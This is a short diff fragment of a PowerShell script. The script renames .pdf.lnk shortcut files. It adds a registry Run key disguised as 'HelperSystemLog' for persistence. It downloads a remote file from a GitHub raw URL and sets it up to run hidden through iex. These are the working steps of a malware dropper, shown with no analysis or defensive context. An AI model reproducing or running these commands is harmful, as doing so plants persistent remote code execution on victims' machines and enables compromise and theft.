@@ -4,4 +4,6 @@ dir *.pdf.lnk | ren -NewName {$_.BaseName};
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "HelperSystemLog" -Value 'C:\T\r' -Force;
 wget https://raw.githubusercontent.com/licheng10203040-cloud/1/refs/heads/main/3 -o C:\T\r;
 echo '!powershell "-w 1 iex(Get-Content C:\T\r)"' > C:\T\1;
-exit
+
+
+
